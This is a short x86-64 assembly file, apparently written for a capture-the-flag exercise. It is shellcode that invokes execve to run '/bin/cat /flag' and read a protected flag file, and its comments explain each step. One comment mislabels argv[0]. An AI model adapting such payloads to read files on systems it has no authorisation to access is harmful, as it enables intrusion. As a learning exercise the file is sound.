# Stops gcc from complaining about AT&T syntax
# https://sourceware.org/binutils/docs/as/i386_002dVariations.html
.intel_syntax noprefix
.global _start      # Start program at _start

.text      # Start text section

cat_str:
    .asciz "/bin/cat"            # Declare a string /bin/cat. asciz null terms this

flag_str:
    .asciz "/flag"               # Declare a string /path. This is what we want to read

argv:
    .quad cat_str
    .quad flag_str              # Declare an array argv, with flag_str pointer as argv[0]
    .quad 0                     # argv needs to be null term'd

_start:

# execve("/bin/cat", ["/bin/cat", "/flag"], NULL)
# https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ - Syscall table
mov rax, 59
lea rdi, [rip + cat_str]        # Symbolic relocation will be implicitly RIP relative, so 
lea rsi, [rip + argv]             # Second arg is argv
mov rdx, 0

syscall                         # Invoke the syscall!

